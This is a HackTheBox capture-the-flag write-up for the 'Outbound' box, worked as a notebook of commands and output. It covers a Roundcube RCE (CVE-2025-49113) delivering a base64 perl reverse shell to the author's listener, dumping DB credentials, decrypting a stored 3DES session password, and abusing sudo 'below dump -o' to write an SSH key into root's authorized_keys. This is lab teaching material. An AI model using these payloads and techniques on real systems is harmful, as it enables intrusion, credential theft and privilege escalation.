---
layout: post
title: "week 9 outbound"
date: 2025-07-19 00:00:00 -0700
categories: challenges
description: "Outbound elevates permissions through simple published CVEs and some creative thinking about where to write what data."
parent: HackTheBox - Season 8
grand_parent: Challenges
event: "htb-season-8"
published: false
tags:
- "linux"
- "easy"
- "roundcube"
- "mail"
- "cve-2025-49113"
- "below"
- "triple-des"
---

# week9-outbound

## Engagement Notes

As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2.

This room starts with an exposed mail server and credentials for a nonprivileged user. Finding a CVE on this gives us a simple RCE with published POCs to use. With that we can steal the database session list which includes another users 3des encrypted password which we can use to retrieve that users email with a password included for ssh login. Using this foothold we can use our sudo access to run a metrics collection tool to overwrite the ssh authorized_keys file of root with our keys to log in.

# Enumeration

### Set variables and baseline functions for further engagement


```python
from utils import * # Use `widget.summary()` to get all the premade code blocks

source =! ip address | grep tun | grep 10 | tr "/" " " | awk '{print $2}'
public_source = requests.get('https://ifconfig.co/ip').text
target = 'outbound.htb'

print(f"source: {source}")
print(f"target: {target}")

initialuser = "tyler"
initialpass = "LhKL1o9Nm3X2"
```

    source: ['10.10.14.81']
    target: outbound.htb


### Port scan target


```python
!rustscan -a $target
```

    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : http://discord.skerritt.blog         :
    : https://github.com/RustScan/RustScan :
     --------------------------------------
    RustScan: Because guessing isn't hacking.
    
    [~] The config file is expected to be at "/home/tokugero/.rustscan.toml"
    [~] File limit higher than batch size. Can increase speed by increasing batch size '-b 524188'.
    Open 10.129.19.116:22
    Open 10.129.19.116:80
    [~] Starting Script(s)
    [~] Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-13 18:43 -0700
    Initiating Ping Scan at 18:43
    Scanning 10.129.19.116 [2 ports]
    Completed Ping Scan at 18:43, 0.12s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 18:43
    Completed Parallel DNS resolution of 1 host. at 18:43, 2.50s elapsed
    DNS resolution of 1 IPs took 2.50s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]
    Initiating Connect Scan at 18:43
    Scanning 10.129.19.116 [2 ports]
    Discovered open port 80/tcp on 10.129.19.116
    Discovered open port 22/tcp on 10.129.19.116
    Completed Connect Scan at 18:43, 0.11s elapsed (2 total ports)
    Nmap scan report for 10.129.19.116
    Host is up, received syn-ack (0.11s latency).
    Scanned at 2025-07-13 18:43:04 PDT for 0s
    
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack
    80/tcp open  http    syn-ack
    
    Read data files from: /nix/store/wgw89vb58b7xdp5zk2r9fqy2qq3xxdd6-nmap-7.97/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 2.76 seconds
    


We find port 22 and 80 open on the target. SSH and Web are pretty common here, let's see what the website looks like.


```python
!curl -v http://$target
```

    * Host outbound.htb:80 was resolved.
    * IPv6: (none)
    * IPv4: 10.129.19.116
    *   Trying 10.129.19.116:80...
    * Connected to outbound.htb (10.129.19.116) port 80
    * using HTTP/1.x
    > GET / HTTP/1.1
    > Host: outbound.htb
    > User-Agent: curl/8.14.1
    > Accept: */*
    > 
    * Request completely sent off
    < HTTP/1.1 302 Moved Temporarily
    < Server: nginx/1.24.0 (Ubuntu)
    < Date: Sun, 13 Jul 2025 17:43:15 GMT
    < Content-Type: text/html
    < Content-Length: 154
    < Connection: keep-alive
    < Location: http://mail.outbound.htb/
    < 
    <html>
    <head><title>302 Found</title></head>
    <body>
    <center><h1>302 Found</h1></center>
    <hr><center>nginx/1.24.0 (Ubuntu)</center>
    </body>
    </html>
    * Connection #0 to host outbound.htb left intact


We wont' spend too much time enumerating other vhosts or directories, since we can start with this mail service with plenty of access to start with.

Logging in with our initial credentials, we can see the about section of the site and see some plugins and the version of roundcube. Looking at the version and searching for CVEs, we find CVE-2025-49113 which is a RCE through a users' upload. Some prerolled payloads conveniently auth, pass in shell code, and invoke it for you through calling the uploaded assets as well. Very convenient for a remote shell.

> Roundcube Webmail 1.6.10  
> Installed plugins  
> Plugin	Version	License	Source  
> archive	3.5	GPL-3.0+  
> filesystem_attachments	1.0	GPL-3.0+  
> jqueryui	1.13.2	GPL-3.0+  
> zipdownload	3.4	GPL-3.0+  

https://github.com/hakaioffsec/CVE-2025-49113-exploit  
This will do a lot of the heavy lifting for us. I modify this code to fit this endpoint URL & URI combination, and modify the way the paylaod is sent so I can get through escaping issues.

Below is an example of the base64 encoded perl reverse shell I used to phone back home to me. I tried other revshells, but this is the first one that worked. It seems like this service cannot touch /dev/tcp which took out a lot of bash native revshells.

```sh
$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 cGVybCAtZSAndXNlIFNvY2tldDska<snip>FNUREVSUiwiPiZTIik7ZXhlYygic2ggLWkiKTt9Oyc=
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```
```sh
 nc -lvn 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.19.116 47494
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

My normal targets for webapps are the database configuration. Rarely does the db config itself give me the data I want, usually it's the users tables inside the DB that I'm after in these engagements.

```sh
$ pwd
/var/www/html/roundcube/config
$ ls -alhn config.inc.php
-rw-r--r-- 1 0 0 3.0K Jun  6 18:55 config.inc.php

$ cat config.inc.php
...
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
...
```

Here we can find the db connection string. Using the mysql client already installed on our victim, we can simply run queries directly against the database.  
I hadn't realized at this point that roundcube doesn't actually store credentials, it just stores valid sessions with credentials embedded in the session data on the DB. Here is some example commands of me navigating the DB.

```sh
mysql -u roundcube -pRCDBPass2025 -e "SHOW DATABASES;"
...
mysql -u roundcube -pRCDBPass2025 -e "SHOW tables from roundcube;"
...
mysql -u roundcube -pRCDBPass2025 -e "select * from roundcube.users;"
user_id username        mail_host       created last_login      failed_login    failed_login_counter    language        preferences
1       jacob   localhost       2025-06-07 13:55:18     2025-06-11 07:52:49     2025-06-11 07:51:32     1       en_US   a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2       mel     localhost       2025-06-08 12:04:51     2025-06-08 13:29:05     NULL    NULL    en_US   a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3       tyler   localhost       2025-06-08 13:28:55     2025-07-12 19:59:09     2025-06-11 07:51:22     1       en_US   a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";}
```

After some more enumeration I found this:

```sh
mysql -u roundcube -pRCDBPass2025 -e "select * from roundcube.session;"
sess_id changed ip      vars
6a5ktqih5uca6lj8vrmgh9v0oh      2025-06-08 15:46:40     172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1<snip>joibWF21vZF9zZXF8czoyOiIxMCI7
```

Navigating the b64 decoded data, I can see some intersting data with the username `jacob`:


```python
print(Chepy("bGFuZ3VhZ2V8czo1OiJlbl9<snip>jtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7")
        .from_base64()
        .find_replace(";", "\n")
        .o
        .decode())
```

    ...
    username|s:5:"jacob"
    ...
    password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
    ...
    


Looking at the source code for roundcube, we can see that encrypted strings are tripledes encoded, and sometimes with an IV. So we need to go fishing for the key so we can decrypt this. 

https://github.com/roundcube/roundcubemail/blob/ba60aa863711e3275495c80c2c3827736da07e9b/program/lib/Roundcube/rcube.php#L900

If we look back at our config.inc.php file, we can see the following line:

```php
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

Let's start with a known session so we can validate our decryption mechanism; we may not know what we're looking at if we just start trying to decrypt this unknown password. To this end, we'll simply log in with `tyler` to generate a session, then pull the db data again.

I promise bro, this is tyler's session data I swear.

```sh
sess_id changed ip      vars
6a5ktqih5uca6lj8vrmgh9v0oh      2025-07-12 20:33:44     172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGVtcHxiOjE7cmVxdWVzdF90b2tlbnxzOjMyOiJndkdJdWxoc1BoeUp6bGRaZlFxMzkycTIxZlhOOXZCdiI7
pi5887olsnhactqd87qmd8h3vd      2025-07-12 20:33:59     172.17.0.1      bGFuZ3VhZ2V8czo1Oi<snip>pOjA7fQ==
```


```python
tyler_3des = (
    Chepy("bGFuZ3VhZ2V8czo1OiJ<snip>0OiJTZW50IjtpOjA7fQ")
        .from_base64()
        .find_replace(";", "\n")
        .regex_search('password.*"(.+)"')
        .from_base64()
        .to_hex()
        .o.decode()
)

print(f"tyler_3des: {tyler_3des}")

```

    tyler_3des: 95c3d5467326aa0d12ae002a0a087bcebaf1e608f015970a



```python
triple_des_key = (
    Chepy("rcmail-!24ByteDESkey*Str")
        .to_hex()
        .o.decode()
    )

print(f"triple_des_key: {triple_des_key}")
```

    triple_des_key: 72636d61696c2d213234427974654445536b65792a537472



```python
print(
    Chepy(tyler_3des)
        .from_hex()
        .triple_des_decrypt(triple_des_key)
        .o[8:] # The first 8 bytes are padding, so we skip them
    )
```

    b'LhKL1o9Nm3X2'


Look familiar? Lets use the same cyberchef recipe to decode Jacob's session password.


```python
jacob_3des = (
    Chepy("bGFuZ3VhZ2V8czo1OiJ<snip>X21vZF9zZXF8czoyOiIxMCI7")
        .from_base64()
        .find_replace(";", "\n")
        .regex_search('password.*"(.+)"')
        .from_base64()
        .to_hex()
        .o.decode()
)

print(f"jacob_3des: {jacob_3des}")

triple_des_key = (
    Chepy("rcmail-!24ByteDESkey*Str")
        .to_hex()
        .o.decode()
    )

print(f"triple_des_key: {triple_des_key}")

print("Jacob's password: ",
    Chepy(jacob_3des)
        .from_hex()
        .triple_des_decrypt(triple_des_key)
        .o[8:] # The first 8 bytes are padding, so we skip them
    )

```

    jacob_3des: 2fb46fd3403c4eec0902bebb9084f1c5c4a09c8936e409bf
    triple_des_key: 72636d61696c2d213234427974654445536b65792a537472
    Jacob's password:  b'595mO8DmwGeD'


This isn't quite Jacob's SSH password. But logging into the email portal we can see an email:

```log
Important Update 
From tyler@outbound.htb on 2025-06-07 07:00
Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler
```

We also have a clue as to our next goal:

```log
Unexpected Resource Consumption
From mel@outbound.htb on 2025-06-08 05:09
We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

## Foothold


```python
jacob_outbound = ssh("outbound.htb", 22, "jacob", "gY4Wr3a1evp4")

print(jacob_outbound.exec("whoami; cat user.txt"))
```

    jacob
    2903ea9b341bfb40934bd39670eb87d2


We're given the hint that we were provided elevated privileges, so lets see what we can sudo.


```python
print(jacob_outbound.exec("sudo -l"))
```

    Matching Defaults entries for jacob on outbound:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
    
    User jacob may run the following commands on outbound:
        (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*


Using this we can see that we have access to all options of /usr/bin/below, but not if they start with config, debug, or -d (also debug).

I spent a while looking around these options and after outputing some basic information using the command.

Looking at the output of `below` I can see utility sources, as well as a version number of the app (0.8.0). It seems this is a monitoring tool for system level information. It's also open source and on github.

```sh
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│07/13/2025 18:48:30 UTC+00:00     Elapsed: 5s     outbound     0.8.0     live                                                                                                                                            │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│CPU            Usage    3.17%                User     0.89%                System   2.27%                                                                                                                                │
│Mem            Total    3.8 GB               Free     2.8 GB               Anon     210.1 MB             File     615.1 MB                                                                                               │
│VM             Page In  0.0 B/s              Page Out 404.4 B/s            Swap In  0.0 B/s              Swap Out 0.0 B/s                                                                                                │
│I/O   (Rd|Wr)  sda      0.0 B/s   |26.1 KB/s                                                                                                                                                                             │
│Iface (Rx|Tx)  docker0  0.0 B     |0.0 B     eth0     1.6 KB    |3.6 KB    lo       28 B      |28 B      veth264aa0.0 B     |0.0 B                                                                                       │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│General   CPU   Mem   I/O   Pressure   Properties                                                                                                                                                                        │
│─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────│
│Name                                               CPU        Mem        CPU Pressure   Mem Pressure   I/O Pressure   Reads      Writes     RW Total   Nr Descendants   Nr Dying Descendants   Tids Current              │
│─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────│
│<root>                                             6.22%      824.4 MB   0.00%          0.00%          0.00%          ?          ?          ?          52               58                     ?                        ▒│
│└─ dev-hugepages.mount                             0.00%      60 KB      0.00%          0.00%          0.00%          0.0 B/s    0.0 B/s    0.0 B/s    0                0                      0                        ▒│
```

Searching up this binary I find two things:  
* https://github.com/facebookincubator/below  
* https://github.com/facebookincubator/below/security/advisories/GHSA-9mc5-7qhg-fp3w  

Looking up this security advisory, I can see that there's a lot of concerns about the default permissions of a directory this tool will read by default, `/var/log/below`, implying that I can overwrite the `/etc/shadow` file to allow root to log in without a password. Unfortunately it seems the `/etc/shadow` file is either chattr +i or mounted RO from the designer, because I cannot arbitrarily log to it.

I spend a lot of time here looking around for below's functionality. I try overwriting pam files, try overwriting passwd files, these just brick the system. Don't blame me for not knowing what this behavior would do, it's not like I intentionally destroy my systems on a daily basis :sob:.

Eventually I found some interesting functionality in the form of `-o` on some of the commands. Using this I can write to arbitrary paths, so I don't need to use the root daemon to execute this for me, I can sudo execute myself. 

The last step is figuring out which of these commands would let me control some form of output. Eventually I stumbled on `below dump` which will take a snapshot of system details and put the output to stdout. However with `-o` I can save this to a file instead. The last piece was finding what data I had some kind of data of which I also had control.


```python
print(jacob_outbound.exec("sudo below dump process --begin now | tail -n 10"))
```

    2025-07-13 18:56:12 22793      22754      update-motd-reb                DEAD       ?          ?          ?          ?          0             ?                                                  1752432972 ?                                                  ?          
    2025-07-13 18:56:12 22794      22751      sshd                           DEAD       ?          ?          ?          ?          0             ?                                                  1752432972 ?                                                  ?          
    2025-07-13 18:56:12 22795      22794      bash                           DEAD       ?          ?          ?          ?          0             ?                                                  1752432972 ?                                                  ?          
    2025-07-13 18:56:12 22796      22795      sudo                           DEAD       ?          ?          ?          ?          0             ?                                                  1752432972 ?                                                  ?          
    2025-07-13 18:56:12 22797      22795      tail                           DEAD       ?          ?          ?          ?          0             ?                                                  1752432972 ?                                                  ?          
    2025-07-13 18:56:12 22798      22796      below                          DEAD       ?          ?          ?          ?          0             ?                                                  1752432972 ?                                                  ?          
    2025-07-13 18:56:12 22799      22796      sighandler                     DEAD       ?          ?          ?          ?          0             ?                                                  1752432972 ?                                                  ?          
    2025-07-13 18:56:12 22800      21813      imap-login                     DEAD       ?          ?          ?          ?          0             ?                                                  1752432972 ?                                                  ?          
    2025-07-13 18:56:12 22801      21813      imap                           DEAD       ?          ?          ?          ?          0             ?                                                  1752432972 ?                                                  ?


This looks like I can print processes, I can probably name a process! But can I get the output to just be what I need to be a parsable config file?


```python
print(jacob_outbound.exec("sudo below dump process --begin now --fields cmdline | grep -v '?' | tail -n 10"))
```

    dovecot/anvil                                      
    dovecot/log                                        
    dovecot/config                                     
    dovecot/stats                                      
    dovecot/auth                                       
    php-fpm: pool www                                  
    sleep 60                                           
    sshd: jacob [priv]                                 
    sshd: jacob


This looks super promising. Now, when we can't garble files to get what we want, sometimes we can use something like log file writing to invoke execution. However, I don't have any way to execute the file I will be writing to. However, I do have an SSH key, and /root/.ssh/authorized_keys is a pretty handy file to have write access to when I want to get in as root. 

The final step, then, will be to name a process with my ssh key, and write the output to that file. The config file can be mostly garbled as long as there's a newline with my key in it near the beginning.


```python
# Copy over a binary that helpfully lets me run as long as I want it to
jacob_outbound.exec("cp /bin/sleep ~/'ssh-ed25519 AAAAC3NzaC1lZDI<snip>dKr58BTNzZv'")
# Lets add the path to the binary to the PATH so I can run it without specifying the full path
jacob_outbound.exec("echo 'export PATH=/home/jacob:$PATH' >> ~/.bashrc")
# Now I run the new binary with some realistic sleep number to keep it running long enough for me to dump the log.
jacob_outbound.exec("'ssh-ed25519 AAAAC3Nz<snip>dKr58BTNzZv' 100 &")
# Finally, dump the log into the authorized_keys file. Here I also must specify something other than the default so my cmdline field isn't truncated. TSV doesn't have any extra mess to worry about so I use this.
jacob_outbound.exec("sudo below dump process --begin now --fields cmdline -O tsv -o /root/.ssh/authorized_keys")
```




    ''



Hopefully the line lines up properly and we can log in..


```python
root_outbound = ssh("outbound.htb", 22, "root", key_file="./id_ed25519")
print(root_outbound.exec("whoami; cat root.txt"))
```

    root
    dbd1454c58d07ca01c71795eb7f0e3ea


And to show what the file looked like after our dump...


```python
print(root_outbound.exec("cat /root/.ssh/authorized_keys | grep -C 3 ed25519"))
```

    ?	
    sshd: jacob [priv]	
    sshd: jacob@notty	
    ssh-ed25519 AAAAC3Nza<snip>58BTNzZv 1000000	
    ?	
    sleep 60	
    ?


You can see, that even with all the garbage, ssh will eventually try the line with the ssh-ed25519, and with its default context anything that comes after the key itself is simply metadata for use in other components that don't matter to auth. 
